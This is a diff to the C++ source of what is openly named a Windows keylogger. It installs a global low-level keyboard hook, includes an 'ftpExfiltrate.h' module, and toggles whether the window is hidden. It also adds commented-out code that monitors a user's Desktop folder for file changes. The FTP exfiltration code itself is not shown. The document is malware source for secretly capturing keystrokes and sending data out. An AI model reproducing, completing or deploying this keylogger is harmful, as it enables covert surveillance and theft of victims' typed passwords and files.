@@ -15,7 +15,11 @@
 #include "helper.h"
 #include "ImageCapture.h"
 #include "ftpExfiltrate.h"
-#include "SetInterval.h"
+#include <string>
+#include <locale>
+#include <codecvt>
+#include <minwinbase.h>
+
 
 using namespace std;
 // Command below to monitor changes in textfile.
@@ -62,6 +66,7 @@ LRESULT MainWindow::HandleMessage(UINT uMsg, WPARAM wParam, LPARAM lParam) {
 		break;
 	case WM_DESTROY:
 		PostQuitMessage(0);
+        _CrtDumpMemoryLeaks();
 		return 0;
 	default:
 		return DefWindowProc(m_hwnd, uMsg, wParam, lParam);
@@ -318,19 +323,88 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 	return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
+VOID CALLBACK completion(DWORD dwErrorCode,
+    DWORD dwNumberOfBytesTransfered,
+    LPOVERLAPPED lpOverlapped) {
+    return;
+}
+
 int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
 {
 	MainWindow win;
 	if (!win.Create(L"Keylogger", WS_OVERLAPPEDWINDOW)) {
 		return 0;
 	}
-	ShowWindow(win.Window(), SW_HIDE);
+	ShowWindow(win.Window(), SW_SHOW);
 	SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc, NULL, 0);
+    /*PWSTR ppszPath;
+    HRESULT hr = getDesktopFolder(&ppszPath);
+    if (SUCCEEDED(hr)) {
+        OutputDebugString(ppszPath);
+    }*/
 
-	
+    //CString csDirectory = _T("C:\\Users\\Matthew\\Desktop\\new");
+    //HANDLE hDirectory = CreateFile(csDirectory,
+    //    GENERIC_READ,
+    //    FILE_SHARE_READ,
+    //    NULL,
+    //    OPEN_EXISTING,
+    //    FILE_FLAG_BACKUP_SEMANTICS,
+    //    NULL);
+
+    //OutputDebugString(L"hello\n");
+    //string str = to_string((int)hDirectory);
+    //OutputDebugStringA(str.c_str());
+    ////// Buffer to get the notification information.
+    //const int MAX_BUFFER = 1024;
+    //BYTE Buffer[MAX_BUFFER];
+    //DWORD dwBytesReturned = 0;
+
+    //OVERLAPPED ovl = { 0 };
+    //ovl.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
+
+    //ReadDirectoryChangesW(hDirectory,
+    //    Buffer,
+    //    MAX_BUFFER,
+    //    FALSE,
+    //    FILE_NOTIFY_CHANGE_ATTRIBUTES|FILE_LIST_DIRECTORY,
+    //    &dwBytesReturned,
+    //    NULL,
+    //    NULL);
+    /*if (dwBytesReturned == 0) return 0;
+    string str = std::to_string(dwBytesReturned);
+    OutputDebugStringA(str.c_str());*/
+
+
+    ////// Cast the buffer as Notification Struct.
+    //FILE_NOTIFY_INFORMATION* pNotifyInfo =
+    //    (FILE_NOTIFY_INFORMATION*)(Buffer);
+
+    ////// Changed file.
+    //CString csFileName = pNotifyInfo[0].FileName;
+    //OutputDebugString(csFileName);
+
+ //   HANDLE desktopH = FindFirstChangeNotificationA("C:\\Users\\Matthew\\Desktop", true, FILE_NOTIFY_CHANGE_ATTRIBUTES);
+ //   OVERLAPPED ovl = { 0 };
+ //   ovl.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
+ //   if (NULL == ovl.hEvent) return ::GetLastError();
+ //   FILE_NOTIFY_INFORMATION strFileNotifyInfo[1024];
+ //   int nCounter = 0;
+ //   wchar_t buffer[1024];
+
+ //   ReadDirectoryChangesW(
+ //       desktopH,
+ //       &strFileNotifyInfo,
+ //       sizeof(strFileNotifyInfo),
+ //       true,
+ //       FILE_NOTIFY_CHANGE_ATTRIBUTES,
+ //       NULL, &ovl, NULL
+ //   );
+ //  swprintf(buffer, 100, L"File Modified: %s", strFileNotifyInfo[0].FileName);
+ //  OutputDebugString(buffer);
 	MSG msg;
 
-	while (GetMessage(&msg, NULL, 0, 0) > 0) {
+    	while (GetMessage(&msg, NULL, 0, 0) > 0) {
 		TranslateMessage(&msg);
 		DispatchMessage(&msg);
 	} 
